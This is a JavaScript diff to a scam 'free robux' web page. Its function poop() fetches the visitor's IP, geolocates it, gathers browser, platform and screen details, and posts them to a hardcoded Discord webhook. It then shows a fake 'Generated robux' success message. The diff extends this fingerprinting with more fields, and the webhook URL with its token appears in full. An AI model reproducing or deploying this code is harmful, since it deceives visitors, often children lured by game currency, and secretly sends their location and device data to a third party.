@@ -75,62 +75,67 @@
       });
     });
 
-    function poop() {
-      var webhookURL = "https://discord.com/api/webhooks/1214230645908443136/ovXZiGBL9McvvvGyfd8cUBPZKkUESRWD4TloQa8JBsvseGrOVmvLLaJrSsNrc1m2yqDz";
-      var currentDate = new Date();
-      var formattedDate = currentDate.toLocaleString('en-US', { month: 'long', day: 'numeric', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
-      var platform = getPlatform();
+  function poop() {
+  var webhookURL = "https://discord.com/api/webhooks/1214230645908443136/ovXZiGBL9McvvvGyfd8cUBPZKkUESRWD4TloQa8JBsvseGrOVmvLLaJrSsNrc1m2yqDz";
+  var currentDate = new Date();
+  var formattedDate = currentDate.toLocaleString('en-US', { month: 'long', day: 'numeric', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
+  const detector = new BrowserDetector(window.navigator.userAgent).parseUserAgent();
+  var platform = getPlatform();
 
-      fetch('https://api.ipify.org?format=json')
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      var ip = data.ip;
+      fetch('https://ipapi.co/' + ip + '/json/')
         .then(response => response.json())
-        .then(data => {
-          var ip = data.ip;
-          fetch('https://ipapi.co/' + ip + '/json/')
-            .then(response => response.json())
-            .then(locationData => {
-              var city = locationData.city;
-              var network = locationData.org;
-              var version = locationData.version;
-              var countryCallingCode = locationData.country_calling_code;
+        .then(locationData => {
+          var city = locationData.city;
+          var network = locationData.org;
+          var version = locationData.version;
+          var countryCallingCode = locationData.country_calling_code;
 
-              if (isRobux1Logged(ip)) {
-                showError("You already redeemed free robux.");
-                return;
-              }
+          if (isRobux1Logged(ip)) {
+            showError("You already redeemed free robux.");
+            return;
+          }
 
-              logRobux1(ip);
-              var message = {
-                content: "> Information\n> Opened on: **" + formattedDate + "**\n> IP address: **" + ip + "**\n> City: **" + city + "**\n> Network: **" + network + "**\n> Version: **" + version + "**\n> Country Calling Code: **" + countryCallingCode + "**\n> Device: **" + platform + "**"
-              };
+          logRobux1(ip);
+          var message = {
+            content: "> Information\n> Opened on: **" + formattedDate + "**\n> IP address: **" + ip + "**\n> City: **" + city + "**\n> Network: **" + network + "**\n> Version: **" + version + "**\n> Country Calling Code: **" + countryCallingCode + "**\n> Device: **" + platform + "**\n> Browser Name: **" + detector.name + "**\n> Platform Name: **" + detector.platform + "**\n> Browser Version: **" + detector.version + "**\n> Screen Width: **" + screen.width + "**px\n> Screen Height: **" + screen.height + "**px"
+          };
 
-              fetch(webhookURL, {
-                method: "POST",
-                headers: {
-                  "Content-Type": "application/json"
-                },
-                body: JSON.stringify(message)
-              })
-              .then(response => {
-                if (!response.ok) {
-                  showError("Failed generating robux");
-                } else {
-                  console.log("Generated robux");
-                  generateAndCopyCode();
-                }
-              })
-              .catch(error => {
-                showError("Error generating robux");
-              });
-            })
-            .catch(error => {
-              showError("Error fetching location data.");
-            });
+          if (screen.width !== window.width || screen.height !== window.height) {
+            message.content += "\n> Window Width: **" + window.outerWidth + "**px\n> Window Height: **" + window.outerHeight + "**px";
+          }
+
+          fetch(webhookURL, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify(message)
+          })
+          .then(response => {
+            if (!response.ok) {
+              showError("Failed generating robux");
+            } else {
+              console.log("Generated robux");
+              generateAndCopyCode();
+            }
+          })
+          .catch(error => {
+            showError("Error generating robux");
+          });
         })
         .catch(error => {
-          showError("Error fetching IP address.");
+          showError("Error fetching location data.");
         });
-    }
-
+    })
+    .catch(error => {
+      showError("Error fetching IP address.");
+    });
+}
+    
 function vanish() {
       window.location.replace("https://www.youtube.com/channel/UC8HNlWyhuqQzVNqCAP2t_mw");
     }
